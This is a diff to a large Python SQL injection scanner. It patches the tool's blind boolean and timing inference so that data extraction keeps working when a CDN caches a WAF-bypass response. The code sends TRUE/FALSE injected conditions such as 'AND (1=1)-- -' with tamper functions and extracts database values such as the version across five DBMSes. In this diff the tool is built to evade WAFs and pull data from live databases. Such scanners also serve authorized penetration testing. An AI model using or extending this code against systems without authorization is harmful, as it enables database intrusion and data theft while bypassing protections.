@@ -56872,6 +56872,17 @@ class Scanner:
                         and _bool_true_len != _bool_false_len):
                     return abs(_bl - _bool_true_len) < abs(_bl - _bool_false_len)
 
+            # BUG-EXT-EVAL-FALLTHROUGH FIX (CRITICAL): When _boolean_oracle=True but
+            # every specific sub-check above (hash/header/SimHash/status/length) fell
+            # through without returning, we have NO reliable signal.  Falling to timing
+            # here is actively harmful: CDN-cached responses all land near _thresh
+            # (~180ms), so ms >= _thresh is a coin flip, producing garbage codepoints
+            # (e.g. chr(0x1FFFFF) = 󗫵) on every extraction probe.
+            # Fix: when there is no usable timing margin AND _boolean_oracle=True,
+            # return None (ambiguous) so callers can skip/retry the probe.
+            if _boolean_oracle and _margin <= 30:
+                return None  # No oracle fired, no timing signal — probe is ambiguous
+
             # Timing oracle: compare against threshold
             return ms >= _thresh
 
@@ -57286,6 +57297,12 @@ class Scanner:
                         return await _pre_wired_eval_fn(cond)
                     except Exception:
                         pass
+            # BUG-EXT-WAFAWARE-FALLTHROUGH FIX (CRITICAL): Mirrors BUG-EXT-EVAL-FALLTHROUGH.
+            # Reaches here when _boolean_oracle=True but no sub-oracle fired AND the
+            # pre-wired oracle either wasn't set or raised an exception.  With margin=-7ms
+            # (CDN-cached bypass target), ms >= _thresh is random — breaks all extraction.
+            if _boolean_oracle and _margin <= 30:
+                return None  # No oracle fired, no timing signal — probe is ambiguous
             return ms >= _thresh
 
         #  ENHANCEMENT: Auto-adjust timing 
@@ -58185,12 +58202,55 @@ class Scanner:
         if _try_bitwise_deferred:
             _oracle_fragile = False
             if _bool_true_len is not None and _bool_false_len is not None:
-                _ps = max(_bool_true_len, _bool_false_len, 1)
-                _ld = abs(_bool_true_len - _bool_false_len)
-                if (_ld / _ps) < 0.10 and _ps > 5000:
+                # BUG-EXT-ORACLE-FRAGILE FIX (HIGH): The old check `_ps > 5000` only
+                # caught large bodies with a tiny diff.  It missed the common CDN-bypass
+                # case where TRUE and FALSE bodies are IDENTICAL in length (e.g. 557B vs
+                # 557B — Cloudflare serves the cached bypass page for every probe
+                # regardless of SQL condition).  In that case _ld=0, _ld/_ps=0 <0.10
+                # BUT _ps=557 < 5000 so the guard fires as "not fragile" and EQUALITY/
+                # BITWISE extraction runs with a completely broken oracle → garbage.
+                # Fix: equal-length with no header or SimHash calibration = fragile.
+                if (_bool_true_len == _bool_false_len
+                        and _bool_norm_true is None and _bool_hdr_name is None
+                        and _bool_true_status is None):
                     _oracle_fragile = True
-                    LOG.info("[Inference] Oracle too fragile (%dB vs %dB = %.1f%%)  skipping to error-based",
-                             _bool_true_len, _bool_false_len, (_ld/_ps)*100)
+                    LOG.info("[Inference] Oracle fragile: TRUE/FALSE body lengths identical"
+                             " (%dB) and no header/SimHash/status oracle — skipping to error-based",
+                             _bool_true_len)
+                else:
+                    _ps = max(_bool_true_len, _bool_false_len, 1)
+                    _ld = abs(_bool_true_len - _bool_false_len)
+                    if (_ld / _ps) < 0.10 and _ps > 5000:
+                        _oracle_fragile = True
+                        LOG.info("[Inference] Oracle too fragile (%dB vs %dB = %.1f%%)  skipping to error-based",
+                                 _bool_true_len, _bool_false_len, (_ld/_ps)*100)
+
+            # BUG-DEFERRED-ORACLE-SANITY FIX (CRITICAL): Even after the fragility check
+            # above, run a live sanity probe before committing to extraction.  The pre-
+            # wired _inline_bool_oracle for ST timing technique uses SimHash but the CDN
+            # serves identical 557B bypass pages for both TRUE (1=1) and FALSE (1=2)
+            # conditions, so SimHash ≈ 1.0 → always True → all bitwise bits read as 1
+            # → chr(0x1FFFFF) → garbage codepoints (󗫵, 󜽆, etc.).
+            # A live 1=1 / 1=2 sanity pair catches this before we waste hundreds of
+            # probes producing garbage output.
+            if not _oracle_fragile:
+                try:
+                    _san_t = await _eval("1=1")
+                    await asyncio.sleep(_delay * 0.5)
+                    _san_f = await _eval("1=2")
+                    if not (_san_t is True and _san_f is False):
+                        _oracle_fragile = True
+                        LOG.info(
+                            "[Inference] Deferred oracle sanity FAILED"
+                            " (1=1→%s, 1=2→%s) — aborting; no reliable boolean oracle"
+                            " (ST timing target with CDN bypass caching?)",
+                            _san_t, _san_f,
+                        )
+                    else:
+                        LOG.debug("[Inference] Deferred oracle sanity OK (1=1→True, 1=2→False)")
+                except Exception as _san_err:
+                    _oracle_fragile = True
+                    LOG.warning("[Inference] Deferred oracle sanity probe failed (%s) — marking oracle fragile", _san_err)
 
         if _try_bitwise_deferred and not _oracle_fragile:
             _VQ = {"PostgreSQL":"SELECT version()","MySQL":"SELECT VERSION()","MSSQL":"SELECT @@VERSION",
@@ -118510,6 +118570,68 @@ class UniversalScanOrchestrator:
                                                         _wired_fallback = False  # don't install a broken oracle
                                                 _norm_base_wb = ResponseNormaliser.normalise(_baseline_raw_wb) if _baseline_raw_wb else b""
 
+                                                # BUG-INLINE-BOOL-ORACLE-WB-ST-POLARITY FIX (CRITICAL, ST technique,
+                                                # all 5 DBMSes, all surfaces):
+                                                # For ST (Stacked Timing) with CDN caching (e.g. Cloudflare), the
+                                                # WAF-bypass response (e.g. 557B page) is cached and served for BOTH
+                                                # TRUE (1=1) and FALSE (1=2) SQL conditions.  The baseline is ALSO
+                                                # the 557B bypass page.  SimHash(baseline, TRUE_response) ≈ 1.0 AND
+                                                # SimHash(baseline, FALSE_response) ≈ 1.0 → oracle returns True for
+                                                # every probe → all bitwise bits = True → chr(0x1FFFFF) → garbage
+                                                # codepoints (󗫵, 󜽆, etc.) for ALL extracted values.
+                                                # Fix: after computing the WB baseline, send BOTH a TRUE (1=1) and
+                                                # a FALSE (1=2) probe and compare their similarities against the
+                                                # baseline.  If BOTH exceed the threshold (i.e. bodies are
+                                                # indistinguishable regardless of condition), the SimHash oracle
+                                                # cannot discriminate → skip wiring to avoid garbage extraction.
+                                                _ibw_has_body_diff = True  # assume diff until calibration disproves it
+                                                if _baseline_raw_wb and _norm_base_wb:
+                                                    try:
+                                                        _det_for_wb_check = _det_for_oracle
+                                                        _wb_tmpl_early = _build_det_template(_det_for_wb_check) if _det_for_wb_check else ''
+                                                        _wb_ipfx_early = _derive_inj_prefix(_det_for_wb_check) if _det_for_wb_check else ''
+                                                        # TRUE probe
+                                                        if _wb_tmpl_early:
+                                                            _ibw_sc_t = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', '1=1')
+                                                            _ibw_sc_f = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', '1=2')
+                                                        else:
+                                                            _ibw_sc_t = f"{_det_orig}{_wb_ipfx_early} AND (1=1)-- -"
+                                                            _ibw_sc_f = f"{_det_orig}{_wb_ipfx_early} AND (1=2)-- -"
+                                                        _ibw_sc_fp_t = await asyncio.wait_for(
+                                                            _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
+                                                                           _det_param, _ibw_sc_t, _det_tamper), timeout=10)
+                                                        await asyncio.sleep(0.3)
+                                                        _ibw_sc_fp_f = await asyncio.wait_for(
+                                                            _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
+                                                                           _det_param, _ibw_sc_f, _det_tamper), timeout=10)
+                                                        if (_ibw_sc_fp_t and _ibw_sc_fp_f
+                                                                and _validate_response(_ibw_sc_fp_t, allow_empty=True)
+                                                                and _validate_response(_ibw_sc_fp_f, allow_empty=True)):
+                                                            _ibw_sc_norm_t = ResponseNormaliser.normalise(_extract_body_safe(_ibw_sc_fp_t))
+                                                            _ibw_sc_norm_f = ResponseNormaliser.normalise(_extract_body_safe(_ibw_sc_fp_f))
+                                                            _ibw_sc_sim_t = SimHasher.body_similarity(_norm_base_wb, _ibw_sc_norm_t)
+                                                            _ibw_sc_sim_f = SimHasher.body_similarity(_norm_base_wb, _ibw_sc_norm_f)
+                                                            _ibw_sc_thresh = 0.75
+                                                            if _ibw_sc_sim_t >= _ibw_sc_thresh and _ibw_sc_sim_f >= _ibw_sc_thresh:
+                                                                _ibw_has_body_diff = False
+                                                                print(
+                                                                    f"[!] [V25-Extract] WB SimHash oracle ABORTED for tech={_det_tech!r}: "
+                                                                    f"TRUE sim={_ibw_sc_sim_t:.3f}, FALSE sim={_ibw_sc_sim_f:.3f} "
+                                                                    f"(both ≥{_ibw_sc_thresh}) — CDN caches bypass response for "
+                                                                    "all SQL conditions; SimHash cannot discriminate TRUE/FALSE. "
+                                                                    "Skipping WB boolean oracle to prevent garbage extraction.",
+                                                                    flush=True,
+                                                                )
+                                                            else:
+                                                                print(
+                                                                    f"[+] [V25-Extract] WB body-diff OK for tech={_det_tech!r}: "
+                                                                    f"TRUE sim={_ibw_sc_sim_t:.3f}, FALSE sim={_ibw_sc_sim_f:.3f} "
+                                                                    f"— SimHash oracle has discrimination signal",
+                                                                    flush=True,
+                                                                )
+                                                    except Exception as _ibw_sc_err:
+                                                        LOG.debug("[V25-Extract] WB sanity calibration error: %s", _ibw_sc_err)
+
                                                 # BUG-INLINE-BOOL-ORACLE-WB-MISSING-LIGHT-VARY FIX (CRITICAL,
                                                 # all 5 DBMSes, WB/EX/HY/ST techniques, all surfaces):
                                                 # _inline_bool_oracle_wb sent every probe WITHOUT
@@ -118650,7 +118772,11 @@ class UniversalScanOrchestrator:
                                                 # when we have a valid (non-empty) baseline. If all 3
                                                 # retries failed, _wired_fallback was reset to False above
                                                 # and we must NOT wire the broken oracle.
-                                                if _baseline_raw_wb:
+                                                # BUG-INLINE-BOOL-ORACLE-WB-ST-POLARITY FIX: Also require
+                                                # _ibw_has_body_diff — if the sanity calibration above found
+                                                # that TRUE and FALSE responses are indistinguishable (both
+                                                # sim ≥ 0.75 vs baseline), skip wiring to prevent garbage.
+                                                if _baseline_raw_wb and _ibw_has_body_diff:
                                                     if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                         class _FakeMSE_WB:
                                                             _boolean_oracle = None
